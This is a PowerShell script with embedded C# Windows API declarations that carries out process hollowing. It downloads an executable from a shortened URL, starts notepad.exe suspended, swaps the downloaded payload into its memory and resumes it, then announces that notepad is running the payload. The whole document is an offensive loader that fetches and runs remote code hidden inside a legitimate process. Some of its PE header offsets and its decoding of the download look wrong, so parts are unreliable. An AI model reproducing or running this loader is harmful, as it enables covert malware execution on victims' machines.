Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Native {
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT64 {
        public ulong P1Home;
        public ulong P2Home;
        public ulong P3Home;
        public ulong P4Home;
        public ulong P5Home;
        public ulong P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs;
        public ushort SegDs;
        public ushort SegEs;
        public ushort SegFs;
        public ushort SegGs;
        public ushort SegSs;
        public uint EFlags;
        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;
        public ulong Rax;
        public ulong Rcx;
        public ulong Rdx;
        public ulong Rbx;
        public ulong Rsp;
        public ulong Rbp;
        public ulong Rsi;
        public ulong Rdi;
        public ulong R8;
        public ulong R9;
        public ulong R10;
        public ulong R11;
        public ulong R12;
        public ulong R13;
        public ulong R14;
        public ulong R15;
        public ulong Rip;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
        public byte[] DummyBytes;
    }

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesRead
    );

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesWritten
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("ntdll.dll", SetLastError=true)]
    public static extern uint NtUnmapViewOfSection(
        IntPtr hProcess,
        IntPtr baseAddress
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool GetThreadContext(
        IntPtr hThread,
        ref CONTEXT64 lpContext
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool SetThreadContext(
        IntPtr hThread,
        ref CONTEXT64 lpContext
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(
        IntPtr hThread
    );
}
"@ -Language CSharp

# CONFIG
$exeUrl = "https://tinyurl.com/mwr259jv"

Write-Host "[*] Downloading 64-bit payload..."
$payloadBytes = Invoke-WebRequest $exeUrl -UseBasicParsing
$pe = $payloadBytes.Content
$peBytes = [System.Text.Encoding]::ASCII.GetBytes($pe)

$si = New-Object Native+STARTUPINFO
$pi = New-Object Native+PROCESS_INFORMATION
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)

Write-Host "[*] Launching notepad suspended..."
$result = [Native]::CreateProcess("C:\Windows\System32\notepad.exe", $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
if (!$result) { Write-Error "[-] Failed to create process"; exit }

# Get base address and context
$ctx = New-Object Native+CONTEXT64
$ctx.ContextFlags = 0x100000 | 0x1F  # CONTEXT_ALL
[Native]::GetThreadContext($pi.hThread, [ref]$ctx) | Out-Null

$buffer = New-Object byte[] 8
[IntPtr]$bytesRead = [IntPtr]::Zero
[Native]::ReadProcessMemory($pi.hProcess, [IntPtr]($ctx.Rdx + 0x10), $buffer, 8, [ref]$bytesRead)
$imageBase = [BitConverter]::ToUInt64($buffer, 0)

# Unmap original executable from memory
[Native]::NtUnmapViewOfSection($pi.hProcess, [IntPtr]$imageBase) | Out-Null

# Parse PE headers to get SizeOfImage and EntryPoint
$newImageBase = $imageBase
$headersSize = [BitConverter]::ToUInt32($peBytes, 0x54) # SizeOfHeaders
$sizeOfImage = [BitConverter]::ToUInt32($peBytes, 0x50)  # SizeOfImage
$entryRVA = [BitConverter]::ToUInt32($peBytes, 0x28)    # AddressOfEntryPoint

# Allocate memory for new image
$remoteBase = [Native]::VirtualAllocEx($pi.hProcess, [IntPtr]$newImageBase, $sizeOfImage, 0x3000, 0x40)

# Write PE headers
[Native]::WriteProcessMemory($pi.hProcess, [IntPtr]$remoteBase, $peBytes, $headersSize, [ref]$null) | Out-Null

# Write each section
$numberOfSections = [BitConverter]::ToUInt16($peBytes, 0x6)
$sectionOffset = 0xF8
for ($i = 0; $i -lt $numberOfSections; $i++) {
    $virtualAddr = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x0C)
    $rawSize = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x10)
    $rawOffset = [BitConverter]::ToUInt32($peBytes, $sectionOffset + 0x14)
    $sectionData = $peBytes[$rawOffset..($rawOffset + $rawSize - 1)]
    [Native]::WriteProcessMemory($pi.hProcess, [IntPtr]($remoteBase.ToInt64() + $virtualAddr), $sectionData, $rawSize, [ref]$null) | Out-Null
    $sectionOffset += 0x28
}

# Set the thread context to the new entry point
$ctx.Rcx = [UInt64]($remoteBase.ToInt64() + $entryRVA)
$ctx.Rip = [UInt64]($remoteBase.ToInt64() + $entryRVA)
[Native]::SetThreadContext($pi.hThread, [ref]$ctx) | Out-Null

# Resume the main thread of the process
[Native]::ResumeThread($pi.hThread) | Out-Null

Write-Host "[+] Hollowing complete! notepad.exe is running your payload."
